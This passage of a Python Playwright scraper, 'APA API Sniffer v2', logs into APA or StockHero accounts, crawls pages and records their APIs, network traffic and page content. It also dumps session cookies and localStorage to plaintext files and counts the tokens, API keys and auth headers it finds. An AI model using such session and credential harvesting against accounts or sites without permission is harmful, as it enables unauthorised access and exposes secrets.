        # Capture images if enabled
        if mode["collect_images"]:
            try:
                img_elements = await page.query_selector_all("img")
                images = []
                for img_el in img_elements:
                    src = await img_el.get_attribute("src")
                    if src:
                        images.append(src)
                page_data["images"] = images[:50]  # First 50 images
            except Exception:
                pass

        # Capture DOM if enabled
        if mode["collect_dom"]:
            try:
                html = await page.content()
                dom_path = IMAGES_DIR / f"{idx:04d}_dom.html"
                dom_path.write_text(html, encoding="utf-8")
                page_data["dom_file"] = str(dom_path.relative_to(RUN_DIR))
            except Exception:
                pass

        # Save cookies and localStorage snapshot for comprehensive mode
        if mode.get("collect_dom") or mode.get("collect_images") or mode.get("collect_apis"):
            try:
                # cookies
                cookies = await page.context.cookies()
                cookie_dir = RUN_DIR / "session"
                cookie_dir.mkdir(parents=True, exist_ok=True)
                cookies_file = cookie_dir / f"{idx:04d}_cookies.json"
                cookies_file.write_text(json.dumps(cookies, indent=2), encoding="utf-8")
                page_data["cookies_file"] = str(cookies_file.relative_to(RUN_DIR))
                # localStorage
                try:
                    ls = await page.evaluate("() => { const o={}; for(let i=0;i<localStorage.length;i++){const k=localStorage.key(i); o[k]=localStorage.getItem(k);} return o; }")
                    ls_file = cookie_dir / f"{idx:04d}_localstorage.json"
                    ls_file.write_text(json.dumps(ls, indent=2), encoding="utf-8")
                    page_data["localstorage_file"] = str(ls_file.relative_to(RUN_DIR))
                except Exception:
                    pass
            except Exception:
                pass

        # Store result
        captured_apis[url] = page_data
        api_count += len(apis_found)
        
        # Friendly status message with all capture data
        status_parts = []
        if apis_found:
            status_parts.append(f"{len(apis_found)} APIs")
        if network_data["errors"]:
            status_parts.append(f"{len(network_data['errors'])} errors")
        if network_data["requests"]:
            status_parts.append(f"{len(network_data['requests'])} requests")
        if network_data["websockets"]:
            status_parts.append(f"{len(network_data['websockets'])} WebSockets")
        if client_data["console"]:
            status_parts.append(f"{len(client_data['console'])} console msgs")
        if client_data["js_errors"]:
            status_parts.append(f"{len(client_data['js_errors'])} JS errors")
        if client_data["performance"]:
            status_parts.append(f"perf metrics")
        if session_auth_data["tokens"]:
            status_parts.append(f"{len(session_auth_data['tokens'])} tokens")
        if session_auth_data["api_keys"]:
            status_parts.append(f"{len(session_auth_data['api_keys'])} API keys")
        if session_auth_data["auth_headers"]:
            status_parts.append(f"{len(session_auth_data['auth_headers'])} auth headers")
        if page_behavior_data["interactions"]:
            interactions = page_behavior_data["interactions"]
            if isinstance(interactions, dict):
                status_parts.append(f"{interactions.get('clicks', 0)} clicks")
        if page_behavior_data["a11y_issues"]:
            status_parts.append(f"{len(page_behavior_data['a11y_issues'])} a11y issues")
        if page_behavior_data["third_party_scripts"]:
            status_parts.append(f"{len(page_behavior_data['third_party_scripts'])} 3rd-party scripts")
        if content_extraction_data["structured_data"]:
            status_parts.append(f"{len(content_extraction_data['structured_data'])} schemas")
        if content_extraction_data["forms"]:
            status_parts.append(f"{len(content_extraction_data['forms'])} forms")
        if content_extraction_data.get("links"):
            total_links = len(content_extraction_data["links"].get("internal", [])) + len(content_extraction_data["links"].get("external", []))
            if total_links > 0:
                status_parts.append(f"{total_links} links")
        if advanced_tracking_data["pixels"]:
            status_parts.append(f"{len(advanced_tracking_data['pixels'])} pixels")
        if advanced_tracking_data.get("cors_requests"):
            status_parts.append(f"{len(advanced_tracking_data['cors_requests'])} CORS")
        if advanced_tracking_data.get("api_patterns"):
            status_parts.append(f"API schema detected")
        
        if status_parts:
            CliOutput.success(f"Captured {', '.join(status_parts)}", indent=1)
        else:
            CliOutput.warn(f"No data captured", indent=1)

        page.remove_listener("response", on_response)
        page.remove_listener("request", on_request)
        page.remove_listener("websocket", on_websocket)
        if mode.get("collect_client_intelligence"):
            page.remove_listener("console", on_console)
            page.remove_listener("pageerror", on_page_error)

    except Exception as e:
        CliOutput.error(f"Error: {e}", indent=1)





async def process_urls(context, login_page, site_type, email, password, urls, start_idx, reauth_lock):
    """Process URLs concurrently using tabs from the given context (keeps session)."""
    total = len(urls)
    tasks = []
    semaphore = asyncio.Semaphore(MAX_CONCURRENT_PAGES)

    async def limited_capture(idx):
        async with semaphore:
            page = await context.new_page()
            try:
                await capture_page_apis(page, urls[idx], idx, total, login_page, site_type, email, password, reauth_lock)
                save_progress(idx)
            finally:
                try:
                    await page.close()
                except Exception:
                    pass

    # Process in batches: first few sequentially to warm up
    for idx in range(start_idx, total):
        if idx < start_idx + 5:  # First 5 sequentially
            await limited_capture(idx)
        else:
            tasks.append(limited_capture(idx))

    if tasks:
        await asyncio.gather(*tasks)


def save_results():
    """Save captured APIs to JSON."""
    global captured_apis, api_count

    try:
        IMAGES_DIR.mkdir(parents=True, exist_ok=True)
        API_DUMP_FILE.write_text(json.dumps(captured_apis, indent=2), encoding="utf-8")
        CliOutput.success(f"Saved {api_count} APIs to {API_DUMP_FILE}")
        
        # Create network summary report
        try:
            total_requests = 0
            total_errors = 0
            
            for page_data in captured_apis.values():
                summary = page_data.get("network_summary", {})
                total_requests += summary.get("total_requests", 0)
                total_errors += summary.get("failed_requests", 0)
            
            if total_requests > 0 or total_errors > 0:
                net_summary = {
                    "total_requests_captured": total_requests,
                    "total_failed_requests": total_errors,
                    "pages_analyzed": len(captured_apis),
                    "detailed_data_location": "network_data/",
                }
                net_file = RUN_DIR / "network_summary.json"
                net_file.write_text(json.dumps(net_summary, indent=2), encoding="utf-8")
                CliOutput.success(f"Network summary: {total_requests} requests, {total_errors} errors")
        except Exception:
            pass
        
        # Create client intelligence summary report
        try:
            total_console = 0
            total_js_errors = 0
            pages_with_perf = 0
            total_state_snapshots = 0
            
            for page_data in captured_apis.values():
                summary = page_data.get("client_intelligence_summary", {})
                total_console += summary.get("console_messages", 0)
                total_js_errors += summary.get("js_errors", 0)
                if summary.get("has_performance_data"):
                    pages_with_perf += 1
                total_state_snapshots += summary.get("state_snapshots", 0)
            
            if total_console > 0 or total_js_errors > 0 or pages_with_perf > 0:
                client_summary = {
                    "total_console_messages": total_console,
                    "total_js_errors": total_js_errors,
                    "pages_with_performance_data": pages_with_perf,
                    "total_state_snapshots": total_state_snapshots,
                    "pages_analyzed": len(captured_apis),
                    "detailed_data_location": "client_intelligence/",
                }
                client_file = RUN_DIR / "client_intelligence_summary.json"
                client_file.write_text(json.dumps(client_summary, indent=2), encoding="utf-8")
                CliOutput.success(f"Client intelligence: {total_console} console msgs, {total_js_errors} JS errors, {pages_with_perf} with perf data")
        except Exception:
            pass
        
        # Create session & auth summary report
        try:
            total_tokens = 0
            total_api_keys = 0
            total_auth_headers = 0
            pages_with_session_storage = 0
            pages_with_indexed_db = 0
            
            for page_data in captured_apis.values():
                summary = page_data.get("session_auth_summary", {})
                total_tokens += summary.get("tokens_found", 0)
                total_api_keys += summary.get("api_keys_found", 0)
                total_auth_headers += summary.get("auth_headers_found", 0)
                if summary.get("has_session_storage"):
                    pages_with_session_storage += 1
                if summary.get("has_indexed_db"):
                    pages_with_indexed_db += 1
            
            if total_tokens > 0 or total_api_keys > 0 or total_auth_headers > 0 or pages_with_session_storage > 0:
                auth_summary = {
                    "total_tokens_found": total_tokens,
                    "total_api_keys_found": total_api_keys,
                    "total_auth_headers_found": total_auth_headers,
                    "pages_with_session_storage": pages_with_session_storage,
                    "pages_with_indexed_db": pages_with_indexed_db,
                    "pages_analyzed": len(captured_apis),
                    "detailed_data_location": "session_auth/",
                }
                auth_file = RUN_DIR / "session_auth_summary.json"
                auth_file.write_text(json.dumps(auth_summary, indent=2), encoding="utf-8")
                CliOutput.success(f"Session/Auth: {total_tokens} tokens, {total_api_keys} API keys, {total_auth_headers} auth headers")
        except Exception:
            pass
        
        # Create page behavior summary report
        try:
            total_interactions = 0
            total_a11y_issues = 0
            total_third_party_scripts = 0
            pages_with_performance = 0
            
            for page_data in captured_apis.values():
                summary = page_data.get("page_behavior_summary", {})
                if isinstance(summary.get("interactions"), dict):
                    total_interactions += summary["interactions"].get("clicks", 0) + \
                                         summary["interactions"].get("form_fills", 0) + \
                                         summary["interactions"].get("navigation_events", 0)
                total_a11y_issues += summary.get("a11y_issues_found", 0)
                total_third_party_scripts += summary.get("third_party_scripts", 0)
                if summary.get("has_performance_data"):
                    pages_with_performance += 1
            
            if total_interactions > 0 or total_a11y_issues > 0 or total_third_party_scripts > 0:
                behavior_summary = {
                    "total_user_interactions": total_interactions,
                    "total_accessibility_issues": total_a11y_issues,
                    "total_third_party_scripts": total_third_party_scripts,
                    "pages_with_performance_data": pages_with_performance,
                    "pages_analyzed": len(captured_apis),
                    "detailed_data_location": "page_behavior/",
                }
                behavior_file = RUN_DIR / "page_behavior_summary.json"
                behavior_file.write_text(json.dumps(behavior_summary, indent=2), encoding="utf-8")
                CliOutput.success(f"Page Behavior: {total_interactions} interactions, {total_a11y_issues} a11y issues, {total_third_party_scripts} scripts")
        except Exception:
            pass
        
        # Create content extraction summary report
        try:
            total_structured_data = 0
            total_forms = 0
            total_links = 0
            total_ctas = 0
            pages_with_rendered_text = 0
            
            for page_data in captured_apis.values():
                summary = page_data.get("content_extraction_summary", {})
                total_structured_data += summary.get("structured_data_found", 0)
                total_forms += summary.get("forms_found", 0)
                total_links += summary.get("links_found", 0)
                total_ctas += summary.get("ctas_found", 0)
                if summary.get("has_rendered_text"):
                    pages_with_rendered_text += 1
            
            if total_structured_data > 0 or total_forms > 0 or total_links > 0:
                extraction_summary = {
                    "total_structured_data": total_structured_data,
                    "total_forms": total_forms,
                    "total_links": total_links,
                    "total_ctas": total_ctas,
                    "pages_with_rendered_text": pages_with_rendered_text,
                    "pages_analyzed": len(captured_apis),
                    "detailed_data_location": "content_extraction/",
                }
                extraction_file = RUN_DIR / "content_extraction_summary.json"
                extraction_file.write_text(json.dumps(extraction_summary, indent=2), encoding="utf-8")
                CliOutput.success(f"Content Extraction: {total_structured_data} schemas, {total_forms} forms, {total_links} links, {total_ctas} CTAs")
        except Exception:
            pass
        
        # Create advanced tracking summary report
        try:
            total_pixels = 0
            total_cors = 0
            pages_with_security_headers = 0
            pages_with_api_patterns = 0
            
            for page_data in captured_apis.values():
                summary = page_data.get("advanced_tracking_summary", {})
                total_pixels += summary.get("pixels_found", 0)
                total_cors += summary.get("cors_requests", 0)
                if summary.get("has_security_headers"):
                    pages_with_security_headers += 1
                if summary.get("has_api_patterns"):
                    pages_with_api_patterns += 1
            
            if total_pixels > 0 or total_cors > 0 or pages_with_security_headers > 0:
                tracking_summary = {
                    "total_pixels": total_pixels,
                    "total_cors_requests": total_cors,
                    "pages_with_security_headers": pages_with_security_headers,
                    "pages_with_api_patterns": pages_with_api_patterns,
                    "pages_analyzed": len(captured_apis),
                    "detailed_data_location": "advanced_tracking/",
                }
                tracking_file = RUN_DIR / "advanced_tracking_summary.json"
                tracking_file.write_text(json.dumps(tracking_summary, indent=2), encoding="utf-8")
                CliOutput.success(f"Advanced Tracking: {total_pixels} pixels, {total_cors} CORS, {pages_with_api_patterns} pages with API patterns")
        except Exception:
            pass
        
        # Write images index if images were downloaded
        try:
            if IMAGES_DIR.exists():
                images = [str(p.relative_to(RUN_DIR)) for p in sorted(IMAGES_DIR.rglob("*")) if p.is_file()]
                if images:
                    IMAGES_INDEX_FILE.write_text(json.dumps(images, indent=2), encoding="utf-8")
                    CliOutput.info(f"Indexed {len(images)} images to {IMAGES_INDEX_FILE}")
        except Exception:
            pass
    except Exception as e:
        CliOutput.error(f"Could not save results: {e}")


# ================================================================================
# MAIN
# ================================================================================

async def main():
    global captured_apis

    CliOutput.header("APA API Sniffer v2 – Enhanced API Capture")
    CliOutput.info(f"Headless: {HEADLESS}")

    # Setup: Run selection
    is_new = select_run()
    
    # Setup: URL selection
    urls = load_urls()
    if not urls:
        return

    # Setup: Capture mode selection
    mode_info = select_capture_mode()

    # If screenshots are enabled, ask about all vs unique
    if mode_info.get("collect_images"):
        print()
        print("📸 Screenshot Mode Selection:")
        print("  1) All screenshots (every page load, size: large)")
        print("  2) Unique screenshots only (deduplicated, size: medium)")
        screenshot_choice = input("Select screenshot mode (default 1): ").strip() or "1"
        
        if screenshot_choice == "2":
            mode_info["capture_unique_screenshots_only"] = True
            CliOutput.success("Screenshot mode: UNIQUE ONLY (deduplicated)")
        else:
            mode_info["capture_unique_screenshots_only"] = False
            CliOutput.success("Screenshot mode: ALL SCREENSHOTS")
    else:
        mode_info["capture_unique_screenshots_only"] = False

    start_idx = 0 if is_new else load_progress(len(urls)) + 1
    start_idx = max(0, min(start_idx, len(urls) - 1))

    # Detect site type from URLs
    site_type = "apa"
    if urls and "stockhero" in urls[0].lower():
        site_type = "stockhero"

    # Get credentials based on site type
    if site_type == "stockhero":
        email = os.getenv("STOCKHERO_EMAIL") or input("StockHero Email: ")
        password = os.getenv("STOCKHERO_PASSWORD") or getpass("StockHero Password: ")
    else:
        email = os.getenv("APA_EMAIL") or input("Email: ")
        password = os.getenv("APA_PASSWORD") or getpass("Password: ")

    # Crawl
    CliOutput.header(f"Capturing ({mode_info['name']}) – {len(urls)} URLs")

    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=HEADLESS)
        context = await browser.new_context()

        # Login once in a persistent page
        login_page = await context.new_page()
        
        if site_type == "stockhero":
            login_ok = await login_to_stockhero(login_page, email, password)
        else:
            login_ok = await login_to_apa(login_page, email, password)

        if not login_ok:
            CliOutput.error("Could not log in; aborting")
            await login_page.close()
            await context.close()
            await browser.close()
            return

        # Capture data (use shared context + login_page so tabs share session)
        reauth_lock = asyncio.Lock()
        await process_urls(context, login_page, site_type, email, password, urls, start_idx, reauth_lock)

        # Cleanup
        await login_page.close()
        await context.close()
        await browser.close()

    # Save
    CliOutput.header("Finalizing")
    save_results()
    CliOutput.success(f"Run complete: {RUN_DIR}")
    CliOutput.info(f"Capture mode: {mode_info['name']}")





if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        CliOutput.warn("Interrupted by user")
        save_results()
